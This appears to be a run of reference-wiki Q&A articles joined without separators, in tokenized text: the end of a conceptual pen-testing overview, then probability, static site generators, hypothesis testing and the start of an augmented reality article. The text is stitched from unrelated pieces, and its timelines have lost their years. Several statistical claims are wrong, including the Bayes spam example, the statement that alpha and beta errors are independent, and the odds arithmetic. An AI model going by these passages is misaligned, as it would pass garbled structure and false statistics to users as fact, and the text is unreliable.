In any case , you should select tools that are easy to use , are suited for automation , can re - verify previous exploits , and generate detailed logs .
Kali Linux is a Linux distribution that includes many useful tools for easy installation and use .
Is n't pen testing the same as ethical hacking ?
Comparing pen testing with ethical hacking .
Source : Kostadinov 2016 .
Often these two terms are used interchangeably , but there 's a subtle difference .
Pen testing may be seen as a subset of ethical hacking .
Pen testing is narrowly focused on discovering and showing that vulnerabilities can be exploited .
Ethical hacking has a broader scope .
An ethical hacker can use pen testing plus various other methods across the entire IT infrastructure .
While pen testing aims to give confidence about system security ( usually based on known vulnerabilities ) , ethical hacking will try to see things from the perspective of a malicious hacker .
An ethical hacker may use novel techniques of hacking .
He may use social engineering , rummage through logs , examine patch installations , sniff networks , etc .
An ethical hacker may infiltrate the system , move laterally within or to other systems , and even export sensitive data .
However , some pen testers may try to include these in their tests .
It 's important to note that both pen testers and ethical hackers are required to get written authorization and a clear understanding of the scope of work .
Are there any standards or methodologies to guide in pen testing ?
Among the more well - known standards is the Penetration Testing Execution Standard ( PTES ) that was defined in 2009 .
Its goal is to provide guidance about tools and techniques .
A standard such as PTES is particularly useful when organizations engage external testers or testing services .
With PTES , it 's easier to filter out low quality testers .
PTES does have its limitations .
Threats are evolving rapidly and it 's impossible for a static standard to be comprehensive .
Thus , PTES should be seen as a minimum requirement .
PTES Technical Guidelines are available online and publicly accessible .
Another standard is called Open Source Security Testing Methodology Manual ( OSSTMM ) from ISECOM .
It 's been around since 2001 .
The Payment Card Industry Data Security Standard ( PCI DSS ) provides guidance for pen testing , among other things .
There 's also an Information Systems Security Assessment Framework ( ISSAF ) but this is not actively updated .
This decade sees the growing popularity of time - sharing computer systems .
Users can remotely access and time - share computers over communication lines .
It 's recognized that if the communication lines are compromised , computer systems could be attacked .
At the annual Joint Computer Conference held in the U.S. , the security of computer communication lines is discussed .
The term " penetration " is used for the first time .
Subsequently , RAND Corporation and Advanced Research Projects Agency ( ARPA ) published a detailed report , commonly called The Willis Report .
This report became influential for later studies .
From the late 1960s and during 1970s , tiger teams were formed .
They 're sponsored by governments and companies .
Their task is to attack computer systems , uncover security holes and then fix them .
Pen testing as we know it today starts here .
In 1972 , an early pioneer of pen testing , James P. Anderson , outlined steps that tiger teams could follow for pen testing .
The U.S. government conducts pen testing on its Multics ( Multiplexed Information and Computing Service ) system , an early system that precedes UNIX .
The pen tests reveal many vulnerabilities despite Multics being one of the most secure systems .
Dan Farmer of Sun Microsystems and Wietse Venema of the Eindhoven University of Technology released a paper titled Improving the Security of Your Site by Breaking Into It .
They use the term " uebercracker " to refer to a system cracker who has gone beyond simple cookbook methods of breaking into systems .
They also describe SATAN ( Security Analysis Tool for Auditing Networks ) , one of the earliest tools to automate pen testing .
It 's written in shell , perl , expect and C. Open Web Application Security Project ( OWASP ) has started .
Its pen testing tool , Zed Attack Proxy ( ZAP ) was released in September 2010 .
OWASP ZAP is free , open - source , cross - platform and well documented .
The Penetration Testing Execution Standard ( PTES ) is started by six information security consultants .
PTES provides guidelines towards effective pen testing .
Probability explained .
Source : One Minute Economics 2017 .
In mathematics , the notation \(\pi\ ) , pronounced as \(pi\ ) , denotes the ratio of circumference of any circle to the diameter of the same circle .
\(\pi\ ) is constant .
It will not vary for circles of any size .
But many other facts in the world are not constant .
Let 's assume the alphabet \(X\ ) denotes the height of adults in India .
\(X\ ) can take any positive real value for any random individual .
Hence \(X\ ) is a variable that takes random values in a range of positive real numbers .
Probability measures how likely or unlikely an outcome is , where the outcome is a Random Variable .
For instance , we can ask , " What 's the probability of picking an Indian adult male who is above six feet ?
" Probability is intimately related to another branch of mathematics called Statistics .
Both these are of fundamental importance to the field of Data Science .
How do we mathematically define the probability of an event ?
Mathematically , probability is the ratio of the number of desired outcomes and all possible outcomes : $ $ P(Outcome)=\frac{n(Desired\ Outcome)}{n(All\ Outcome)}$$ Any desired outcome is a subset of all possible outcomes .
The value of probability therefore ranges from zero to one .
The limits have the following interpretation : Zero : the outcome will never occur .
One : the outcome is guaranteed to occur .
The set of all outcomes is called the Sample Space .
When the number of outcomes is large or grouping outcomes is more suitable for a study , it 's common to group one or more outcomes into what we call an event .
An outcome can be part of multiple events .
Could you illustrate probability with some simple examples ?
If we toss a coin , there are only two possible outcomes : head or tail .
Assuming both outcomes are equally likely , the probability of getting a head is 1/2 = 0.5 .
Likewise , the probability of getting a tail is also 0.5 .
Taken together , the probability of getting either head or tail is 0.5 + 0.5 = 1 .
This makes sense since there are no other outcomes besides head or tail .
Let 's roll a dice .
The probability of getting an odd prime number ( 3 or 5 ) is 2/6 = 0.33 .
The probability of getting a number greater than 6 is 0/6 = 0 .
The probability of getting a number less than or equal to 6 is 6/6 = 1 .
Why does probability work ?
Probability Structure for Different Variables .
Source : Pannetier 2012 .
Any random variable , however random , will have its own identifiable characteristics .
For example , the variable may be highly probable at one value with dropping probabilities at neighbouring values .
This variability around the most probable value helps us to model random variables .
In technical terms , we call this the distribution of the random variable .
When we plot the number of occurrences against the value , we get a distribution curve .
Random variables are typically modelled on average value , variability ( spread ) , skewness ( asymmetry ) and kurtosis ( " tailedness " ) .
For example , let 's consider the response time of a computing system .
When the system is under high load , the average response time increases .
What 's more interesting is that the spread of response time around this average is also greater .
Thus , under different loading the response time random variable exhibits different characteristics .
Exceptions ( popularly called Outliers ) will affect probability generalisation .
They have to be kept out when building realistic models .
What is the probability related to distributions ?
An example of binomial distribution .
Source : Walker 2018 .
Probability looks at the likelihood of a specific outcome or event .
Distribution looks at all outcomes or events .
Let 's take the example of a coin toss .
We know from theory that the probability of a head is 0.5 .
However , there 's also an experimental approach .
For example , experimenting with 100 tosses might result in 49 turning out to be heads .
Hence , the probability of head is 0.49 .
Such an experiment is termed the Bernoulli Trials .
When we list probabilities for all outcomes ( head and tail ) , we end up with a Bernoulli Distribution .
We can perform a variation of the coin - toss experiment .
We can toss a coin 32 times and call this a single experiment .
We repeat this experiment many times , say 50,000 times .
Finally , we calculate the probability of getting 4 heads in each experiment of 32 coin tosses .
Such a series of experiments is called Binomial Trials .
When we list the probabilities for all outcomes , we end up in Binomial Distribution .
What are probability distributions and how are they useful ?
Common Probability Distributions .
Source : Owen 2015 .
Probability , when identified and listed for all possible outcomes , is called Probability Distribution .
For instance , if we find probabilities of adult males in India with heights in ranges of 0 - 3.5 , 3.5 - 4 , 4 - 4.5 , 4.5 - 5 , 5 - 5.5 , 5.5 - 6 and 6 + feet , we have a probability distribution .
Such a distribution is closely related to the concept of histogram .
With a histogram , we plot the count of values within each range .
With distribution , we convert these counts into probabilities .
In both cases , a graphical plot helps us to read easily the average , variability , skewness , kurtosis , outliers , etc .
Given the distribution , an event can be simulated at random within the boundaries of the distribution .
In other words , to create random variables for simulation purposes , we need distribution .
For example , let 's consider the number of people arriving at the ATM every 60 minutes .
This can be modeled as Poisson distribution .
We can simulate queues at ATM , calculate waiting times and decide if need another ATM needs to be installed .
Likewise , if we know distributions of outcomes in a game , we can simulate winning odds and take appropriate risks .
When does probability work ?
Often we are unable to gather data from the entire sample space or population .
We typically collect a sample of data from the population .
Probability works when the sample size is large .
For instance , we wish to find the probability of an Indian adult male height of six feet and above .
A sample size of 100 will not give a reliable number .
However , a sample size of 10,000 would be more reliable .
The more , the better .
Stated formally as the Law of Large Numbers , the probability of an event from a sample will converge to the actual value of the population when the sample size is large .
What are the axioms of Probability ?
Axioms of Probability .
Source : Taylor 2017 .
There are obvious rules for probability .
These rules are called Axioms of Probability .
These were formulated by Russian mathematician Andrei Kolmogorov .
These axioms can be explained as follows : The probability of any event is a non - negative real number .
The probability of the entire sample space is one .
This follows from the fact that there are no events outside the sample space .
The probability of the union of two mutually exclusive events is the sum of their individual probabilities .
What are mutually exclusive and non - mutually exclusive events ?
Mutually Exclusive and Non - Mutually Exclusive Events .
Source : Cruzan 2018 .
Let us say , there are two events denoted with random variables \(A\ ) and \(B\ ) .
If \(A\ ) and \(B\ ) do n't occur together , they 're mutually exclusive .
They 're also called disjoint events .
For instance , cooking is an event \(A\ ) and cycling is an event \(B\ ) .
These two are mutually exclusive : a person does n't cook and cycle at the same time .
$ $ P(A\ and\ B ) = 0\ or\ neglibible \\ \Rightarrow P(A\ or\ B)=P(A)+P(B)-P(A\ and\ B ) \\ \Rightarrow P(A\ or\ B)=P(A)+P(B ) , since\ P(A\ and\ B)=0$$ On the contrary , if \(A\ ) and \(B\ ) happen together , they are non - mutually exclusive events .
For instance , cooking is an event \(A\ ) and listening to music is an event \(B\ ) .
They can happen at the same time .
$ $ P(A\ and\ B)\neq0 \\ \Rightarrow P(A\ and\ B ) = P(A)+P(B)-P(A\ or\ B ) \\ \Rightarrow P(A\ or\ B)=P(A)+P(B)-P(A\ and\ B)$$ Could you explain joint , conditional and marginal probabilities ?
An Example of joint and marginal probabilities .
Source : Devopedia 2020 .
Let 's consider two events : buying Bread \(A\ ) , buying Jam \(B\ ) .
Marginal probability is the proportion of customers who bought bread regardless of whether they bought Jam or not .
It 's called marginal because it occurs at the margins of the probability table ( see figure ) .
Joint probability is the proportion of customers who bought both bread and jam .
Conditional probability is the proportion of customers who 're likely to buy bread when they 've already bought Jam , and vice - versa .
Marginal Probability $ $ P(A ) = \frac{n(Cust\ with\ Bread)}{n(Cust ) } = \frac{90}{1000 } \\ P(B ) = \frac{n(Cust\ with\ Jam)}{n(Cust ) } = \frac{50}{1000}$$ Joint Probability $ $ P(Cust\ with\ Bread+Jam ) \\ = P(A\ and\ B ) = \frac{n(A\ and\ B)}{n(Cust ) } = \frac{40}{1000}$$ Conditional Probability $ $ P(Cust\ with\ Bread\ given\ Jam ) \\ = P(A|B)=\frac{n(A\ and\ B)}{n(B ) } = \frac{40}{50 } \\ P(Cust\ with\ Jam\ given\ Bread ) \\ = P(B|A)=\frac{n(A\ and\ B)}{n(A)}= \frac{40}{90}$$ Conditional Probability reduces the sample space based on condition .
Rather than considering all customers ( 1000 ) , we only consider customers who bought Bread ( 90 ) or customers who bought Jam ( 50 ) , that is , the marginal numbers .
How are odds different from probability ?
Probability vs Odds .
Source : Stomp on Step1 2018 .
Odds is defined as the ratio of chances of an event happening and chances of the same event not happening .
Consider the ratio of customers buying milk to those not buying milk .
If this ratio is more than 1 , then the odds are in favour of hypotheses ( buying milk ) , else the odds are against hypotheses .
Consider customers buying bread and jam : $ $ Odds(Bread+Jam ) \\ = \frac{P(Bread+Jam)}{P(Bread - Jam ) } \\ = \frac{40}{50}=0.8 \\ Odds(Jam+Bread ) \\ = \frac{P(Jam\ with\ Bread)}{P(Jam - Bread ) } \\ = \frac{40}{10}=4$$ For every 0.8 customers who buy Bread and Jam , one customer will buy only Bread .
For every 4 customers who buy jam and bread , one customer will buy only jam .
Thus , the Odds(Buying Jam with Bread ) > Odds(Buying Bread with Jam ) .
This implies jam drives bread purchase .
Sizable Bread buyers prefer Bread without Jam .
What is Bayes ' Theorem ?
Bayes ' Theorem .
Source : Buckingham 2011 .
Given hypothesis H and evidence E , Bayes ' Theorem can be written as \(P(H|E ) = P(E|H ) \dot P(H ) / P(E)\ ) .
Bayes ' Theorem , also called Bayes ' Rule or Bayes ' Law , uses prior probability \(P(H)\ ) , accounts for new evidence \(P(E|H)\ ) and results in posterior probability \(P(H|E)\ ) .
Often , prior probability is sourced from experts due to challenges in evaluating evidence .
Bayesian probability basically revises probability considering every new evidence .
This probability will converge to its true value over many revisions on repeated evidence .
The Bayesian approach is used in fields such as epistemology , statistics , and inductive logic .
It relies on conditional probabilities and empirical learning .
The key insight of the theorem is " that a hypothesis is confirmed by any body of data that its truth renders probable " .
Could you give some applications of Bayes Probability ?
One application is for spam filtering .
The idea is to classify an email as spam .
The email may or may not contain the word " Viagra " and not all mail with this word may be spam .
We calculate the probabilities based on our prior knowledge of the number of spam mails received .
\(P(spam)\ ) is prior knowledge of spam mails in inbox .
But the probability of the word appearing in a previous spam mail can give us a better estimate .
P(V|spam ) is the likelihood and P(V ) is the marginal likelihood .
$ $ P(spam|V ) = P(spam ) * \frac{P(V|spam)}{P(V ) } \\ where\ P(V)=P(V|spam)+P(V|not\ spam)$$ \(P(V|spam)/P(V)\ ) is evidence from data that probability of word Viagra in spam mail .
\(P(spam|V)\ ) is the posterior probability of mail being spam with the word Viagra in it .
When 100 % of mail with Viagra is spam , then \(P(spam|V)=P(spam)\ ) .
When less than 100 % of mail with Viagra is spam , then \(P(spam|V ) < P(spam)\ ) .
What are Frequentist and Bayesian approaches to Probability ?
Frequentists lean on the Law of Large numbers to back their probability estimate .
For instance , a coin toss has equal probability of head or tail .
This is derived from a large number of trials .
Frequentists believe any deviation from equal probability is due to chance .
Bayesians argue that belief or prior knowledge should be accounted for while calculating probability .
Belief suggests a probability .
New evidence may notch up or notch down the probability and form a new belief .
Bayesians do not require the Law of Large Numbers backing , but leverage them where applicable .
Probability may be revised with a new piece of evidence , eventually converging to true probability after repeated revisions .
For instance , the probability of a new robot failing at a task starts with a belief , say \(p\ ) , and as new evidence arrives , we revise \(p\ ) .
Frequentist and Bayesian approaches can be applied to all estimates , including probability .
While the two approaches are distinct , Bayesian probability complements Frequentist probability when the system is not yet stable .
There 's insufficient data to get backing from the Law of Large Numbers .
The Sixteenth century Italian mathematician Girolamo Cardano was interested in gambling , to which he applies mathematics .
Although gambling has been around for centuries , randomness is not a recognized concept .
People continued to believe in Gods and oracles , until the Renaissance .
Cardano 's work is the first of its kind , although his work was published only much later , in 1663 .
Today we know that he made some fundamental mistakes .
In a series of letters analyzing the problem of points , French mathematicians Blaise Pascal and Pierre de Fermat develop what can be seen as the foundations of a mathematical theory of probability .
Their work was popularized by Christian Huygens in a publication in 1657 .
Jakob ( James ) Bernoulli publishes Ars Conjectandi , in which he introduces many important concepts : permutations , a priori , a posteriori , Bernoulli trials , random variables .
Bernoulli showed that the probability of an event can be approximated by the frequency of occurrence of the event from a large number of trials .
This later came to be called the Law of Large Numbers .
The diagram that Bayes uses to develop his theory .
Source : Bayes 1763 , pp .
385 .
Thomas Bayes ' now famous work on probability is posthumously published .
The Bayesian approach to probability was adopted and popularized by Pierre - Simon Laplace , until it was challenged in the early 20th century by mathematicians R. A. Fisher and Jerzy Neyman .
To Bayes , probability is a measure of personal belief or reasonable expectations of the event .
Cover of Laplace 's Analytical Theory of Probability , in French .
Source : Sourget 2018 .
With his publication of Analytical Theory of Probability , Pierre - Simon Laplace brings together recent developments in the field .
This important work shows the application of probability to scientific problems .
Thus , probability is no longer just about games of chance .
Laplace himself states , It is remarkable that probability , which began with the consideration of games of chance , should have become the most important object of human knowledge ... [ It ] is , at bottom , nothing but common sense reduced to calculus ... It teaches us to avoid the illusions which often mislead us .
Russian mathematician A. N. Kolmogorov provides an axiomatic basis for the mathematical theory of probability , thus laying the foundations for a modern treatment of the subject .
Popular Static Site Generators .
Source : Devopedia 2018 .
A static site generator is an application that uses plain text files rather than a database as the content repository and builds HTML files by applying themes , layouts and templates to them .
The generated static site files are delivered to the end user exactly as they are on the server .
Hence , there is no server - side language or database .
The generated files are HTML , CSS and JavaScript , served with graphic files ( jpeg , gif , svg , webgl ) and data formats ( JSON or XML ) .
Static sites offer several advantages in speed , security and scalability over dynamic sites ( Content Management Systems ) .
What are static sites and how are they created ?
Static Site Generators .
Source : KeyCDN 2018 .
Static sites are basic websites that can be built by simply creating a few HTML pages and publishing them to a Web server .
Over a period of time , the way in which static sites were generated has progressed in the following manner : 1990s : Static sites were created by directly creating HTML files .
2000s : WYSIWYG ( What You See is What You Get ) Desktop applications were used to create and edit websites .
2010s : File system compilers are used to generate static sites .
How does a static site generator work ?
A simple illustration of what a static site generator does .
Source : Camden and Rinaldi 2017 , fig .
1 - 2 .
A static site generator parses templates , partials , liquid code , markdown and synthesizes ( combining into a coherent whole ) a static site .
The static site generator script itself is written in a programming language like Ruby , Go , Python , React , etc .
Most of them generate a website from a set of files : The content is produced in lightweight syntax like Markdown or Asciidoc .
A templating engine ( Liquid , Go Template , Nunjucks ) is responsible for the logic while generating the HTML .
A converter ( kramdown , commonmark , blackfriday , Asciidoctor ) transforms the lightweight syntax into HTML .
Most static site generators support one or more file - based data formats like JSON , YAML , and TOML to define the metadata .
What is the JAMstack ?
The JAM stack .
Source : Bull 2017 .
JAMstack is the abbreviation for JavaScript , APIs , and Markup stack .
This describes the main attributes of a statically generated site .
Matt Billman , Co - founder & CEO , Netlify , came up with the term JAMstack in 2012 .
The new term was intended to change the archaic connotation of " static sites " .
This is because the term " static site " is often misunderstood to describe the experience characteristics of a site rather than the attributes of the site 's architecture which delivers it .
The JAM stack architecture enables the seamless integration of microservices .
Microservices provide easy access to functionality like form handling , authentication , real - time databases without the need for a dedicated back - end .
Peter Levine of Andreesen Horowitz venture capital firm commented that it ’s ridiculous that the web is still clinging on to monolithic backends — with their high costs , slower speeds , and huge surface area for attacks — in an age of microservices .
What are the advantages of using static site generators ?
Comparing Static vs Dynamic Websites .
Source : Ramos 2016 .
We note the following advantage of SSG : Performance — Faster since there 's no server side processing / computing involved and no database connections to be made .
Resilience — More resilient to sudden traffic spikes .
For high - availability websites , single points of failures are reduced .
Security — When compared to dynamic CMS sites , static pages are easier to secure .
No server - side language exploits , no database vulnerabilities and fewer attack vectors .
Hosting — Server setup and maintenance is simpler and cheaper as memory and CPU requirements are not high compared to dynamic sites .
Upgrades and new versions of the server - side language or the database do n't affect the generated static pages .
Portability — Since the site is not coupled to a complex hosting infrastructure , it can be moved from one place to another and redeployed in a simpler manner .
Compliance — Simple architecture contributes to easier compliance , especially when building something for a large company and hosting in their environment .
Attrition Avoidance — Static sites do n't demand sustained monitoring , patching missing dependencies or infrastructure .
Version Control — Since the entire site is file based , a version control system like git can keep track of all changes to content and configuration .
What are the challenges / limitations to using Static Site Generators ?
Static CMS workflow of Netlify .
Source : Josh 2014 .
Complex Workflow — Most of the mature static site generators were intended for hobbyist programmers , which has resulted in a complex workflow for clients .
Editing and previewing production changes is complicated .
Competitive Ecosystem — With over 450 static site generators in the open , a lot of effort is duplicated to solve the same problem of basically rendering markdown .
Realtime changes — Real - time changes are not possible in the current system as opposed to CMSs .
Large static sites sometimes take minutes to generate accurately .
They load , render , and forget on each run .
For example , when a change is made to a menu , every page that uses it has to be regenerated and uploaded .
Developer Experience — Developers have to familiarize themselves with the file system conventions and directory structure surrounding static site generation .
For example , " you have to put your markdown files here and then it turns into this URL structure " .
Additionally , templating languages that seem to dumb down what you can do , frustrates experienced developers .
Could you mention some popular Static Site Generators ?
Some popular static site generators include Jekyll ( Ruby ) , Hugo ( Go ) , Hexo ( Node.js ) , GitBook ( JS ) , Octopress ( Ruby ) , Gatsby ( ReactJS ) , Pelican ( Python ) , Brunch ( JS ) , Metalsmith ( JS ) and Middleman ( Ruby ) .
Netlify reports the ten most popular and best - supported static - site generators , based on GitHub ’s top starred repositories .
A comprehensive list of all possible static site generators is maintained by Static Site Generators .
Details include when it was created , the last time it was updated and the language it is built with .
A similar list is maintained at StaticGen .
This list offers additional details like the templating language supported by the project and a description pulled from the project repository .
What parameters should I consider while choosing a static site generator ?
The build time for Hugo is significantly less than that of Jekyll .
Source : Macrae 2018 .
Build Time — Time to generate the final site for a given set of input files .
On large sites , this can be tens of minutes .
Hugo , Gatsby and Nuxt are faster than Jekyll .
Templates and Themes — The availability of templates and themes with a suitable licence and the ease with which new templates or themes can be created .
Project Activity and Adoption — GitHub stars are a reasonable indication of good project activity .
A more active project that has greater adoption is more likely to be supported over a longer period of time .
Portability — Are the file structure , content syntax and templating language fairly standard ?
With standard technologies such as Markdown , content can be more easily ported to another SSG .
Plugins — The plugins you require should work with the SSG .
More generally , some SSGs provide most features out - of - the - box ( Gatsby , Next , Nuxt ) .
Others provide minimal features that are then expanded by a vast array of plugins , often developed by the community .
Jekyll is in the latter camp with lots of plugins .
Deployment — Support for continuous integration and continuous deployment .
What kind of sites are most suited for Static Site Generators ?
Static site generators are broadly useful for building sites that focus heavily on delivering content , have a low degree of user interactivity and update infrequently .
It is suited for mission - critical sites where traffic spikes and security are causes of concern .
Public administrations in the US 18F , in the UK Alphagov or in France Etalab seem to embrace this workflow as the version - control - workflow makes sense for distributed teams in addition to avoiding latency , downtime and errors .
What kinds of sites are not suited for Static Site Generators ?
Static site generators may not be suited for the following : Sites that are largely customised for each individual user that visits the page , such as e - commerce sites .
Sites that need to reflect real - time changes to content or templates .
Sites that require an administration interface .
Sites which have several content ( untrusted ) creators .
Since static sites are flexible , anything contained within source Markdown files can be rendered as page content .
Users may be able to include scripts , widgets or numerous undesired items .
Very large sites that could result in increased build times .
Could you list some popular static site generator deployments ?
Raising $ 250 + Million from the Obama campaign site .
Source : fundraisinggenius.co .
Healthcare.gov went from 32 servers to 1 ( and one for fall over ) .
In 2012 , Obama 's $ 250 M fundraising platform was built using a static site generator .
The team that built the Hillary Clinton site built the Obama site .
Nest and MailChimp now use static site generators for their primary websites .
Vox Media has built a whole publishing system around Middleman .
Carrot , a large New York agency and part of the Vice empire , builds websites for some of the world ’s largest brands with its own open - source generator , Roots .
Several of Google ’s sites , such as " A Year In Search " and Web Fundamentals , are static .
The Smashing Magazine static site was benchmarked at 10 times faster than their earlier WordPress deployment .
The New Dynamic Website lists some popular deployments using static site generators .
How is content edited and managed on static sites ?
Most static site generation occurs via the command line .
Moving the generated files to the hosting server can also be automated with command line scripts or tools .
However , browser - based editors have been making their presence felt .
While traditional CMS such as Wordpress , Joomla , Magento or Drupal generate pages dynamically , some SSGs provide a rich UI for editing pages and also host the site .
Thus , these are hosted CMSs with static content .
Static content is updated when edited and saved , and not when a request comes to the server .
Among the static CMS are Prose , Surreal CMS and Forestry.io .
Prose.io is a free service designed specifically for editing Jekyll projects stored on GitHub .
There are also services like Surreal CMS and Forestry.io .
Many more static CMSs are listed on GitHub .
CloudCannon offers a web - based editor geared towards non - technical users .
It uses Jekyll and Git workflows .
It builds the site , minifies assets and publishes on its hosting .
What are the options for hosting static sites ?
Gatsby.js offers multiple options to read data and deploy the site .
Source : Chernev 2017 .
Broadly , we have two options : Cloud file storage : Content is pushed to the cloud for storage .
When web requests come in , static files are directly served .
Examples include Amazon S3 , Google Cloud Storage , Rackspace Cloud , and Microsoft Azure .
Static file hosting providers : Content can be edited online , which then triggers static generation and update to the hosting .
Examples include Netlify , Forge , GitHub , and Surge.sh .
Can dynamic aspects be added to static sites ?
Dynamic aspects that can be part of a generated static site .
Source : Parr 2017 , 12:16 .
Usually , dynamic aspects are added using the & lt;script&gt ; tag whose source is a JS file on a different server .
The remote data is loaded using Ajax ( Asynchronous JavaScript + XML ) .
Comments : Disqus , Staticman , Livewire and Facebook Forms : Wufoo , Typeform , Google forms , Formspree , FormKeep .
Events : Webhooks , moment.js Search : Google , Swiftype , AddSearch , Lunr , Algolia , Aerobatic Forums : Discourse Shopping Carts : Ecwid , Snipcart , GO Commerce Assets ( CDNs ) : imgix , Cloudinary Backend as a Service ( BaaS ) : Parse and Kinvey offer APIs for developers to pull arbitrary dynamic data into a static page .
The first static website by Tim Berners - Lee becomes publicly accessible .
Vermeer Technologies launches FrontPage 1.0 , a static website creation software .
Microsoft acquired Vermeer in January 1996 .
It was branded as part of the Microsoft Office suite from 1997 to 2003 .
Macromedia creates Dreamweaver , a static website creation software , which was acquired by Adobe in 2005 .
Dries Buytaert launches Drupal CMS for dynamic websites .
A joint effort between Matt Mullenweg and Mike Little to create a fork of b2 / cafelog resulted in Wordpress CMS .
John Gruber created Markdown .
Markdown allows content creators to focus on content rather than markup such as HTML .
This may be seen as an essential piece towards the birth of static site generators , to convert Markdown to HTML that can be rendered on browsers .
Joomla CMS was born as a result of a fork of Mambo .
Tom Preston - Werner , founder and former CEO of GitHub , creates Jekyll , a static site generator written in Ruby .
Alexis Métaireau releases the first working version of Pelican , a static site generator written in Python .
Thomas Reynolds releases the first version of Middleman , a static site generator written in Ruby .
Johan Nordberg creates Wintersmith , a static site generator written in Node.js .
Steve Francia creates Hugo , a static site generator built on the Go programming language .
Illustrating a sample drawn from a population .
Source : Six - Sigma - Material.com .
Suppose we want to study the income of a population .
We study a sample of the population and draw conclusions .
The sample should represent the population for our study to be a reliable one .
Null hypothesis \((H_0)\ ) is that the sample represents the population .
Hypothesis testing provides us with a framework to conclude if we have sufficient evidence to either accept or reject a null hypothesis .
Population characteristics are either assumed or drawn from third - party sources or judgements by subject matter experts .
Statistically , population data and sample data are characterised by moments of its distribution ( mean , variance , skewness and kurtosis ) .
We test the null hypothesis for equality of moments where population characteristic is available and conclude if the sample represents populations .
For example , given only the mean income of the population , we validate if the mean income of the sample is close to the population mean to conclude if the sample represents the population .
What are the math representations of the population and sample parameters ?
Population and sample parameters .
Source : Rolke 2018 .
Population mean and population variance are denoted in Greek alphabets \(\mu\ ) and \(\sigma^2\ ) respectively , while sample mean and sample variance are denoted in English alphabets \(\bar x\ ) and \(s^2\ ) respectively .
Could you explain the sampling error ?
Graphical representations of sampling error .
Source : Nurse Key 2017 , fig .
15 - 2 .
Suppose we obtain a sample mean of \(\bar x\ ) from a population of mean \(\mu\ ) .
The two are defined by the relationship |\(\bar x\ ) - \(\mu\)| > = 0 : If the difference is insignificant , we conclude the difference is due to sampling .
This is called sampling error and this happens due to chance .
If the difference is significant , we conclude the sample does not represent the population .
The reason has to be more than chance for difference to be explained .
Hypothesis testing helps us to conclude if the difference is due to sampling error or due to reasons beyond sampling error .
What are some of the assumptions behind hypothesis testing ?
The important assumption is that the population follows normal distribution .
The sample distribution may or may not be normal .
We obtain the mean of the sample and conclude the sample is part of the population when the sample mean is in the vicinity of population mean .
What are the types of errors with regard to hypothesis testing ?
The Matrix shows types of errors in hypothesis testing .
Source : howMed 2013 .
In concluding whether a sample represents the population , there is scope for making errors on the following counts : Not accepting that sample represents the population when in reality it does .
This is called type - I or \(\alpha\ ) error .
Accepting that sample represents the population when in reality it does not .
This is called type - II or \(\beta\ ) error .
For instance , granting a loan to an applicant with a low credit score is \(\alpha\ ) error .
Not granting a loan to an applicant with a high credit score is ( \(\beta\ ) ) error .
How do we measure type - I or \(\alpha\ ) error ?
Illustration of p - value in the population distribution .
Source : Heard 2015 .
p - value signifies probability of committing a type - I error .
The observed sample mean \(\bar x\ ) is overlaid on population distribution of values with mean \(\mu\ ) and variance \(\sigma^2\ ) .
The proportion of values beyond \(\bar x\ ) and away from \(\mu\ ) ( either in left tail or in right tail or in both tails ) is p - value .
\(\alpha\ ) is the limit beyond which we reject null hypothesis ; that is , if p - value < = \(\alpha\ ) we reject null hypothesis .
The interpretation of p - value is as follows : Whenever the p - value is > 5 % , we conclude the sample is highly likely to be drawn from a population with mean \(\mu\ ) and variance \(\sigma^2\ ) .
We accept Null hypothesis \((H_0)\ ) .
Whenever the p - value is < 5 % , we conclude that the sample does not show enough evidence to be part of the population .
i.e. , probability of sample is drawn from a population with mean \(\mu\ ) and variance \(\sigma^2\ ) is less than 5 % .
We do not accept null hypothesis \(H_0\ ) .
What are one - tailed and two - tailed tests ?
When acceptance of \(H_0\ ) involves boundaries on both sides , we invoke the two - tailed test .
For example , if we define \(H_0\ ) as a sample drawn from a population with age limits in the range of 25 to 35 , then testing of \(H_0\ ) involves limits on both sides .
Suppose we define the population as greater than age 50 , we are interested in rejecting a sample if the age is less than or equal to 50 ; we are not concerned about any upper limit .
Here we invoke the one - tailed test .
A one - tailed test could be left - tailed or right - tailed .
What 's the relation between the level of significance \(\alpha\ ) and p - value ?
The predefined limit for \(\alpha\ ) error is referred to as level of significance .
The standard for level of significance is 5 % , but in some studies it may be set at 1 % or 10 % .
In the case of two - tailed tests , it 's \(\alpha/2\ ) on either side .
Level of significance ( also referred to as \(\alpha\ ) because we are defining type - I error limits ) limits p - value , below which we reject Null Hypothesis .
We can also state that p - value is the probability of rejecting the Null Hypothesis when it is true .
For instance , if the p - value is below the 5 % level of significance , we reject the Null Hypothesis .
If the p - value is above 5 % , the conclusion is that we do n't have sufficient evidence to reject the Null Hypothesis .
In general , if the p - value is less than \(\alpha\ ) , the results are said to be statistically significant and not due to chance .
How do we determine sample size and confidence - interval for sample estimate ?
As sample size increases , the margin of error falls .
Source : Wikipedia 2018 .
The Law of Large Numbers suggests the larger the sample size , the more accurate the estimate .
Accuracy means the variance of estimate will tend towards zero as sample size increases .
Sample size can be determined to suit the accepted level of tolerance for deviation .
Confidence - interval of sample mean is determined from sample mean offset by variance on either side of the sample mean .
The formulae for determining sample size and confidence interval depends on what we estimate ( mean / variance / others ) , sampling distribution of estimate and standard deviation of estimate 's sampling distribution .
How do we measure type - II or \(\beta\ ) error ?
Illustrating type - II or beta error .
Source : Gordon 2011 .
We overlay sample mean 's distribution on population distribution . The proportion of overlap of sampling estimate 's distribution on population distribution is \(\beta\ ) error .
The larger the overlap , the larger the chance the sample does belong to the population with mean \(\mu\ ) and variance \(\sigma^2\ ) .
Incidentally , despite the overlap , p - value may be less than 5 % .
This happens when the sample mean is way off the population mean , but the variance of sample mean is such that the overlap is significant .
How do we control \(\alpha\ ) and \(\beta\ ) errors ?
Understanding alpha and beta errors together .
Source : McNeese 2015 .
Errors \(\alpha\ ) and \(\beta\ ) are independent of each other .
Increasing one does not decrease the other .
Similar to p - value that manifests \(\alpha\ ) , Power of Test manifests \(\beta\ ) .
The power of the test indicates how confident we are in rejecting null hypothesis .
$ $ Power\ of\ test = 1-\beta $ $ This can be interpreted as follows : Low p - value and high power of test will help us decisively conclude the sample does not belong to the population .
The high p - value and low power of the test will help us decisively conclude the sample does belong to the population .
When we can not conclude decisively , it is advisable to go for larger samples and multiple samples to ensure we made the right decision .
The cost of committing \(\alpha\ ) error and the cost of committing \(\beta\ ) error are determined by the error tolerances we set .
With the coming of the social web , mobile web and Big Data , information has become plenty and easily accessible .
As late as the mid-2010s , much of this information remained within the digital world of servers , computers and smartphones .
Augmented Reality ( AR ) attempts to remedy this by bringing digital information into the real world .
